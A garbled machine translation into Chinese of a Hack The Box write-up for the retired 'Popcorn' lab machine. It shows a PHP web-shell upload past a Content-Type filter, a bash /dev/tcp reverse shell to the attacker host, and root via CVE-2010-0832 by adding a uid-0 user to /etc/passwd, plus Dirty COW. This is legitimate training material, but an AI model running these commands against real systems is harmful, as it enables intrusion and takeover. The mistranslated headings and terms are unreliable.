# 生物质代谢：爆米花

[0xdf.gitlab.io](https://0xdf.gitlab.io/2020/06/23/htb-popcorn.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fpopcorn-cover.png) 

爆米花是一个中等大小的盒子，虽然不在TJ Null的名单上，但对我来说感觉非常像OSCP。一些枚举将导致一个洪流托管系统，我可以在其中上传，并且绕过过滤器，让PHP web外壳运行。从那里，我将利用CVE-2010-0832，这是Linux身份验证系统（PAM）中的一个漏洞，我可以利用它来使我的当前用户成为系统上任何文件的所有者。有一个光滑的漏洞利用脚本，但我也会展示手动利用它。我还会很快展示脏牛，因为它在这里确实有效。

## 箱子信息

名字

[爆米花](https://www.hackthebox.eu/home/machines/profile/4) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-popcorn.png) 

发行日期

15 3月 2017

停用日期

26 五月 2017

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

中等 \[30\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fpopcorn-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fpopcorn-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

21天 12小时 31分钟 24秒。[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F32)](https://www.hackthebox.eu/home/users/profile/32)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

21天 14小时 18分 45秒。[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F32)](https://www.hackthebox.eu/home/users/profile/32)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F1)](https://www.hackthebox.eu/home/users/profile/1)-

## 侦察

### n地图

`nmap`找到两个打开的 TCP 端口，即固态混合端口 （22） 和 HTTP （80）：

    root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.6
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 11:36 EDT
    Nmap scan report for 10.10.10.6
    Host is up (0.016s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
    Nmap done: 1 IP address (1 host up) scanned in 11.00 seconds
    
    root@kali# nmap -p 22,80 -sC -sV -oA scans/tcpscripts 10.10.10.6
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 11:37 EDT
    Nmap scan report for 10.10.10.6
    Host is up (0.010s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
    |_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
    80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
    |_http-server-header: Apache/2.2.12 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
    

基于 [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) 和 [Apache](https://packages.ubuntu.com/search?keywords=apache2) 版本，主机运行的是比 Ubuntu Trusty 14.04 更早的版本。还有一些古尔金表明[它来自Ubuntu 9.10业力](https://launchpad.net/ubuntu/karmic/i386/apache2.2-common/2.2.12-1ubuntu2)。

### 网站 - TCP 80

#### 网站

该网站只是一个旧的默认页面：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621114758759.png) 

#### 目录暴力破解

我将与该网站运行：`gobuster`

    root@kali# gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster-root-med -t 40
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.6
    [+] Threads:        40
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Timeout:        10s
    ===============================================================
    2020/06/21 11:48:45 Starting gobuster
    ===============================================================
    /test (Status: 200)
    /index (Status: 200)
    /torrent (Status: 301)
    /rename (Status: 301)
    [ERROR] 2020/06/21 11:49:39 [!] Get http://10.10.10.6/server-status: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
    ===============================================================
    2020/06/21 11:50:27 Finished
    ===============================================================
    

#### /测试

`/test`显示了一个 PHP 信息页面：

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621114938644.png)](https://0xdf.gitlab.io/img/image-20200621114938644.png)

[_点击查看完整图片_](https://0xdf.gitlab.io/img/image-20200621114938644.png)

有一堆关于如何配置PHP的信息，这些信息通常很有用，但我在这里不需要任何信息。

我会注意到：`file_uploads`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621115424749.png) 

这意味着如果我能找到一个LFI，我可能会得到代码执行，就像我在[尼尼微](https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html)所做的那样。

#### /重命名

这看起来像用于重命名文件的 API 端点：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621115845409.png) 

我做了一些尝试，试图让它工作。我试图重命名为 在 。错误消息似乎泄漏了此目录的路径：`index.html``0xdf.html``http://10.10.10.6/rename/index.php?filename=index.html&newfilename=0xdf.html`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621125729030.png) 

我无法让它重命名任何有用的东西。在这一点上，我想如果我能找到一个可以上传文件的地方，但我需要重命名它，这可能会被使用。例如，如果我可以在PNG文件中上传PHP代码，但只能使用有效的图像扩展名，那么这可能会派上用场，然后将文件移动到这样Web服务器将执行它。`.php`

#### /洪流

`/torrent`提供了洪流主机的实例：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621120228848.png) 

有一个上传页面，但它只是重定向到登录表单。有一个浏览页面，它当前显示一个洪流：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621122823616.png) 

我在登录时尝试了一些猜测，但随后单击了“注册”链接：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621120342052.png) 

它似乎有效：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621120358454.png) 

我可以登录：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621120440900.png) 

登录后，我可以访问上传表单：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621120547278.png) 

我尝试上传PHP网络外壳，但它出错了：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621120644079.png) 

我去了[Kali下载页面](https://www.kali.org/downloads/)并抓取了一个有效的种子文件。当我提交该文件进行上传时，它会挂起一分钟，然后在尝试重定向时报告成功：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621123058432.png) 

当我允许重定向时，我在这个洪流的页面：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621123221644.png) 

If I click “Edit this torren”, a new form pops up:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621123353559.png) 

I can use this to upload the image associated with the torrent. If I provide it an image, It shows:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621123501616.png) 

Looking at the torrent page, I see the uploaded image now. Looking at the HTML, the image is referred to by the following url:

    http://10.10.10.6/torrent/thumbnail.php?gd=2&src=./upload/0ba973670d943861fb9453eecefd3bf7d3054713.png&maxw=96
    

I thought this could be a LFI, but it’s including the referenced file as an image, so even if I can traverse outside the current directory, it doesn’t really help.

Given the looks like a path, I checked , and it returned a directory listing including my uploaded image:`src``http://10.10.10.6/torrent/upload/`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621123746462.png) 

## Shell as www-data

### Test Filters

There are two opportunities to upload files here, the torrent and the image. I started with the image because I’m more comfortable with how an image looks. If I submit a simple php webshell, it returns “Invalid file”. There is some filtering going on that I’ll need to bypass.

I’ll find the allowed upload of a PNG in Burp and send it to Repeater. There are three common ways that a website will check for valid file types by comparing them to an allow- or deny-list:

*   file extension
*   `Content-Type` header
*   [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)

I’ll start by changing one at a time to see if the site blocks. First, I’ll change the extension to . It doesn’t seem to mind:`.php`

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621124500483.png)_Click for full size image_](https://0xdf.gitlab.io/img/image-20200621124500483.png)

That is a real security vulnerability, because a server should never allow a user to upload anything that can be named , as then the server is likely to execute it as PHP code.`.php`

If I change the header to , it blocks it (even with the file name changed back to :`Content-Type``application/x-php``.png`

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621124643359.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20200621124643359.png)

更改内容似乎并不重要：

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621124754152.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20200621124754152.png)

### 上传

根据过滤器测试，似乎我可以命名一个文件并包含PHP代码，只要我将 更改为有效的图像。`.php``Content-Type`

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621124856522.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20200621124856522.png)

我将从中继器发送它（或者我可以通过表单再次上传shell，并使用代理来拦截请求并修改它）。

当我检查时，那里有一个PHP文件（似乎以SHA1哈希值命名）：`/torrent/upload`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621125015779.png) 

它给出了执行力：

    root@kali# curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php?cmd=id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

### 壳

要获得一个外壳，我将作为反向外壳开始并传递：`nc``cmd`

    root@kali# curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'"
    

在：`nc`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.6.
    Ncat: Connection from 10.10.10.6:33054.
    bash: no job control in this shell
    www-data@popcorn:/var/www/torrent/upload$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

我将升级外壳：

    www-data@popcorn:/var/www/torrent/upload$ python -c 'import pty;pty.spawn("bash")'
    www-data@popcorn:/var/www/torrent/upload$ ^Z
    [1]+  Stopped                 nc -lnvp 443
    root@kali# stty raw -echo
    root@kali# fg
                                                           reset
    reset: unknown terminal type unknown
    Terminal type? screen
    www-data@popcorn:/var/www/torrent/upload$
    

这个用户实际上可以抓住：`user.txt`

    www-data@popcorn:/home/george$ cat user.txt 
    5e36a919************************
    

## Priv： www-data –>根

### 列举

环顾唯一的主目录，我会注意到文件：`/home/george``.cache/motd.legal-displayed`

    www-data@popcorn:/home/george$ find . -type f -ls
        76    4 -rw-r--r--   1 george   george        220 Mar 17  2017 ./.bash_logout
        82    4 -rw-r--r--   1 george   george       3180 Mar 17  2017 ./.bashrc
     42885  832 -rw-r--r--   1 george   george     848727 Mar 17  2017 ./torrenthoster.zip
     42883    0 -rw-r--r--   1 george   george          0 Mar 17  2017 ./.cache/motd.legal-displayed
     42884    0 -rw-r--r--   1 george   george          0 Mar 17  2017 ./.sudo_as_admin_successful
      2210    4 -rw-r--r--   1 george   george         33 Mar 17  2017 ./user.txt
     43648    4 -rw-------   1 root     root           19 May  5  2017 ./.nano_history
     44232    4 -rw-------   1 root     root         1571 Mar 17  2017 ./.mysql_history
       499    4 -rw-------   1 root     root         2769 May  5  2017 ./.bash_history
       107    4 -rw-r--r--   1 george   george        675 Mar 17  2017 ./.profile
    

`motd.legal-displayed`.它目前是空的，但它引起了我的兴趣，因为这些类型的文件可能会导致代码执行，因为它们通常在新会话启动时执行。谷歌搜索“motd.legal显示的特权”返回了[一个漏洞利用数据库漏洞](https://www.exploit-db.com/exploits/14339)。

### 手动漏洞利用

#### 背景

上面的脚本实际上做得很好，而且非常光滑。我将在最后展示这一点。但我想了解这个漏洞。Web上没有大量详细的解释，但是通过阅读漏洞利用脚本，漏洞在于用户登录（调用PAM模块）时如何设置目录权限。我的反向外壳没有触发它，因为它不是登录名。但是我可以使用SSH通过编写密钥来登录。然后，漏洞利用的作用是删除目录，并将其替换为指向文件的符号链接。然后，在登录时，该文件将由我的用户拥有。`~/.cache``~/.cache`

#### 作为万维网数据

我无法删除乔治主目录中的目录，因为该文件归乔治所有，不可写：`~/.cache``motd.legal-displayed`

    www-data@popcorn:/home/george$ rm -rf .cache/
    rm: cannot remove `.cache/motd.legal-displayed': Permission denied
    www-data@popcorn:/home/george$ ls -l .cache/motd.legal-displayed 
    -rw-r--r-- 1 george george 0 Mar 17  2017 .cache/motd.legal-displayed
    

我可以在目录中执行此操作。我只需要一种登录方式。我将在 www-data 的主目录中创建一个目录，并生成一个 RSA 密钥对：`www-data``.ssh`

    www-data@popcorn:/home/george$ cd ~
    www-data@popcorn:/var/www$ mkdir .ssh
    www-data@popcorn:/var/www$ ssh-keygen -q -t rsa -N '' -C 'pam'
    Enter file in which to save the key (/var/www/.ssh/id_rsa): 
    www-data@popcorn:/var/www$ ls .ssh/
    id_rsa  id_rsa.pub
    

我将公钥复制到并设置权限：`authorized_keys`

    www-data@popcorn:/var/www$ cp .ssh/id_rsa.pub .ssh/authorized_keys
    www-data@popcorn:/var/www$ chmod 600 .ssh/authorized_keys 
    

现在没有在 ：`.cache``/var/www`

    www-data@popcorn:/var/www$ ls -la                                                    
    total 28                                                                             
    drwxr-xr-x  4 www-data www-data 4096 Jun 21 21:39 .               
    drwxr-xr-x 15 root     root     4096 Mar 17  2017 ..                                 
    -rw-------  1 www-data www-data   44 Jun 21 21:39 .bash_history                      
    -rw-r--r--  1 www-data www-data  177 Mar 17  2017 index.html    
    drwxr-xr-x  2 www-data www-data 4096 Mar 17  2017 rename  
    -rw-r--r--  1 www-data www-data   21 Mar 17  2017 test.php 
    drwxr-xr-x 15 www-data www-data 4096 Mar 17  2017 torrent 
    

如果我获取私钥的副本，将其带回主机，然后作为w数据SSH到爆米花，我不仅会得到一个shell：

    root@kali# ssh -i /tmp/key www-data@10.10.10.6
    Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686
    
    To access official Ubuntu documentation, please visit:
    http://help.ubuntu.com/
    
      System information as of Sun Jun 21 21:49:51 EEST 2020
    
      System load: 0.0               Memory usage: 5%   Processes:       111
      Usage of /:  6.2% of 14.80GB   Swap usage:   0%   Users logged in: 0
    
      Graph this data and manage this system at https://landscape.canonical.com/
    
    
    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.
    
    $
    

但是该目录显示有一个：`.cache``motd.legal-displayed`

    www-data@popcorn:~$ find .cache/ -type f -ls
      4082    0 -rw-r--r--   1 www-data www-data        0 Jun 21 21:49 .cache/motd.legal-displayed
    

#### 获取写入密码

我将清理目录并将其替换为指向以下链接的链接：`~/.cache``/etc/sudoers`

    www-data@popcorn:~$ rm -rf .cache/
    www-data@popcorn:/var/www$ ln -s /etc/passwd .cache
    www-data@popcorn:/var/www$ ls -la .cache 
    lrwxrwxrwx 1 www-data www-data 11 Jun 21 22:04 .cache -> /etc/passwd
    

现在我将使用SSH再次登录，然后由以下人员拥有：`/etc/passwd``www-data`

    www-data@popcorn:/var/www$ ls -l /etc/passwd
    -rw-r--r-- 1 www-data www-data 1031 Mar 17  2017 /etc/passwd
    

#### 添加根用户

使用写入权限，我只需添加一个 root 用户。首先，我需要一个密码哈希：

    www-data@popcorn:/var/www$ openssl passwd -1 0xdf
    $1$sWwJSjdl$vj3sfStwX82SUTKJDoYhI1
    

现在，我将用户添加到 ：`/etc/passwd`

    www-data@popcorn:/var/www$ echo 'oxdf:$1$sWwJSjdl$vj3sfStwX82SUTKJDoYhI1:0:0:pwned:/root:/bin/bash' >> /etc/passwd  
    

用户是 oxdf，密码是 的哈希值，用户和组 ID 为 0 表示 root，描述是 pwned，主目录是 ，shell 是 。`0xdf``/root``/bin/bash`

#### 壳

现在我可以只用牛气来获取根壳：`su`

    www-data@popcorn:/var/www$ su - oxdf
    Password: 
    root@popcorn:~# id
    uid=0(root) gid=0(root) groups=0(root)
    

并抓取 ：`root.txt`

    root@popcorn:~# cat root.txt
    f1223310************************
    

### 脚本

#### 分析

[Exploid-DB 脚本](https://www.exploit-db.com/exploits/14339)定义了一堆函数，执行一些基本检查，然后运行以下命令：

    KEY="$(mktemp -u)"
    key_create || { echo "[-] Failed to setup SSH key"; exit 1; }
    backup ~/.cache || { echo "[-] Failed to backup ~/.cache"; bye; }
    own /etc/passwd && echo "$P" >> /etc/passwd
    own /etc/shadow && echo "$S" >> /etc/shadow
    restore ~/.cache || { echo "[-] Failed to restore ~/.cache"; bye; }
    key_remove
    echo "[+] Success! Use password toor to get root"
    su -c "sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \
      chgrp shadow /etc/shadow; nscd -i passwd >/dev/null 2>&1; bash" toor
    

`key_create`创建一个SSH密钥并将其安装到当前用户的主目录中，小心备份已经存在的任何内容。

`backup ~/.cache`将做到这一点 - 创建目录的备份副本。

该函数值得一看：`own`

    own() {
        [ -e ~/.cache ] && rm -rf ~/.cache
        ln -s "$1" ~/.cache || return 1
        echo "[*] spawn ssh"
        ssh -o 'NoHostAuthenticationForLocalhost yes' -i "$KEY" localhost true
        [ -w "$1" ] || { echo "[-] Own $1 failed"; restore ~/.cache; bye; }
        echo "[+] owned: $1"
    }
    

如果存在，它将删除它。然后，它创建指向目标文件的链接，首先从主体开始，然后是 。然后，它运行 SSH 连接到该框以运行该命令，然后断开连接。它验证它现在是否对文件具有写入权限。`~/.cache``/etc/passwd``/etc/shadow``true`

因此，在对 的每次调用中，它都会获得写入访问权限，然后添加一行，从而将用户 toor 添加为 root 用户，就像我手动执行的那样。`own`

然后，它会恢复 ，并清理添加的 SSH 密钥。`.cache`

最后，它使用一个 long 命令进行调用，以作为用户 toor 的 root 用户运行。当我输入该密码toor时，它会运行以下命令：`su -c`

*   从 和 中删除 toor 用户的行`/etc/passwd``/etc/shadow`;
*   将这两个文件的所有者更改为root;
*   将组更改为阴影;`/etc/shadow`
*   `nscd`是名称服务（包括）的缓存守护程序，这将使[缓存失效](https://linux.die.net/man/8/nscd)`passwd`;
*   运行以提供外壳。`bash`

基本上，它会自行清理，然后发射外壳。

#### 跑

我给盒子重置了一个，重新上传了一个网络外壳，得到了一个外壳，带有pty。然后我使用Python网络服务器（）上传脚本，并且：`python3 -m http.server 80``wget`

    www-data@popcorn:/dev/shm$ wget 10.10.14.14/pam_motd.sh
    --2020-06-21 22:28:38--  http://10.10.14.14/pam_motd.sh
    Connecting to 10.10.14.14:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 3043 (3.0K) [text/x-sh]
    Saving to: `pam_motd.sh'
    
    100%[======================================>] 3,043       --.-K/s   in 0.004s  
    
    2020-06-21 22:28:38 (761 KB/s) - `pam_motd.sh' saved [3043/3043]
    

该脚本运行并返回根外壳：

    www-data@popcorn:/dev/shm$ bash pam_motd.sh 
    [*] Ubuntu PAM MOTD local root
    [*] SSH key set up
    [*] spawn ssh
    [+] owned: /etc/passwd
    [*] spawn ssh
    [+] owned: /etc/shadow
    [*] SSH key removed
    [+] Success! Use password toor to get root
    Password: 
    root@popcorn:/dev/shm#
    

### 脏牛

鉴于这个盒子的年龄，这里肯定有几个内核漏洞。例如，显示它正在运行：`uname -a``2.6.31`

    root@popcorn:/dev/shm# uname -r
    2.6.31-14-generic-pae
    

它可能容易受到[脏牛的攻击](https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions)。它的页面包含 [POC 列表](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)。我运气最好。我可以抓取[这段代码](https://github.com/FireFart/dirtycow/blob/master/dirty.c)并在Popcorn上编译它：`dirty.c`

    www-data@popcorn:/dev/shm$ gcc -pthread dirty.c -o dirty -lcrypt
    

现在运行它：

    www-data@popcorn:/dev/shm$ chmod +x dirty
    www-data@popcorn:/dev/shm$ ./dirty
    /etc/passwd successfully backed up to /tmp/passwd.bak
    Please enter the new password: 
    Complete line:
    firefart:fiek5FdMtod.2:0:0:pwned:/root:/bin/bash
    
    mmap: b78a8000
    ^C
    

由于某种原因，它有时会挂起。一分钟后，我会杀死它。但是用户仍然被添加：

    www-data@popcorn:/dev/shm$ su - firefart
    Password: 
    firefart@popcorn:~# id
    uid=0(firefart) gid=0(root) groups=0(root)
    firefart@popcorn:~#
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2020/06/23/htb-popcorn.html)